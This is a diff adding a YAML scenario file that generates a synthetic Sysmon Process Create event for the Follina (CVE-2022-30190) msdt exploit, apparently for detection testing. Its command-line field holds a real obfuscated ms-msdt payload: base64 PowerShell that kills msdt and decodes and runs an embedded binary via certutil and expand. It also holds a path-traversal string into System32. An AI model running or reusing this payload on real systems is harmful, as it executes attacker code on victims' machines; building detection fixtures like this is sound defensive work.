@@ -1,0 +1,116 @@
+type: scenario
+description: |
+  A diagnostics tool is started through its protocol handler with a file
+  path that walks up far past the drive root before naming a system binary.
+  Sysmon EID 1 (Process Create) records the tool started by a command shell,
+  its browse-for-file parameter carrying a long run of parent-directory
+  steps before a path under the system directory, for example a signature
+  stub. The event records the launch, not the named binary running.
+tags: [eid1, cve-2022-30190]
+mitre:
+  tactics: [execution]
+  techniques: [T1059]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+  sysmon_pid:          gen.int(min=1000, max=4000)
+  sysmon_tid:          gen.int(min=1000, max=9999)
+  event_record_id:     gen.int(min=5000, max=99999)
+  user_name:           gen.username()
+  user:                "${ref.domain_short}\\${ref.user_name}"
+  logon_guid_raw:      fn.upper(gen.uuid())
+  logon_guid:          "{${ref.logon_guid_raw}}"
+  logon_id_hex:        gen.hex(len=5, case=lower)
+  logon_id:            "0x${ref.logon_id_hex}"
+  terminal_session_id: 2
+  process_guid_raw:    fn.upper(gen.uuid())
+  process_guid:        "{${ref.process_guid_raw}}"
+  process_id:          gen.int(min=5000, max=9999)
+  parent_guid_raw:     fn.upper(gen.uuid())
+  parent_process_guid: "{${ref.parent_guid_raw}}"
+  parent_process_id:   gen.int(min=200, max=4999)
+  image:               'C:\Windows\System32\msdt.exe'
+  hashes:              "MD5=BB98CE2BD520AC69CB3D2F830974CABE,SHA256=C1237BDD2B574C1CBBB4A0D990773BBED5B6FE3BD14F8011C0E79F9CDDCA2B4E,IMPHASH=5D314604CE5F7FF83060B18832AA0D35"
+  handler_params:      '"C:\WINDOWS\system32\msdt.exe"  ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=calc IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression(''[System.Text.Encoding]''+[char]58+[char]58+''UTF8.GetString([System.Convert]''+[char]58+[char]58+''FromBase64String(''+[char]34+''JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw==''+[char]34+''))''))))'
+  traversal_path:      'i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe'
+  params_tail:         ' IT_AutoTroubleshoot=ts_AUTO"'
+  command_line:        "${ref.handler_params}${ref.traversal_path}${ref.params_tail}"
+  current_directory:   'C:\Program Files\ansible\sysmon\'
+  parent_image:        'C:\Windows\System32\cmd.exe'
+  parent_command_line: '"cmd.exe" /s /k pushd "C:\Program Files\ansible\sysmon"'
+
+steps:
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.event_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.process_guid
+            - "@Name": ProcessId
+              "#text": ref.process_id
+            - "@Name": Image
+              "#text": ref.image
+            - "@Name": FileVersion
+              "#text": "10.0.14393.0 (rs1_release.160715-1616)"
+            - "@Name": Description
+              "#text": Diagnostics Troubleshooting Wizard
+            - "@Name": Product
+              "#text": "Microsoft® Windows® Operating System"
+            - "@Name": Company
+              "#text": Microsoft Corporation
+            - "@Name": OriginalFileName
+              "#text": msdt.exe
+            - "@Name": CommandLine
+              "#text": ref.command_line
+            - "@Name": CurrentDirectory
+              "#text": ref.current_directory
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.logon_guid
+            - "@Name": LogonId
+              "#text": ref.logon_id
+            - "@Name": TerminalSessionId
+              "#text": ref.terminal_session_id
+            - "@Name": IntegrityLevel
+              "#text": High
+            - "@Name": Hashes
+              "#text": ref.hashes
+            - "@Name": ParentProcessGuid
+              "#text": ref.parent_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.parent_process_id
+            - "@Name": ParentImage
+              "#text": ref.parent_image
+            - "@Name": ParentCommandLine
+              "#text": ref.parent_command_line
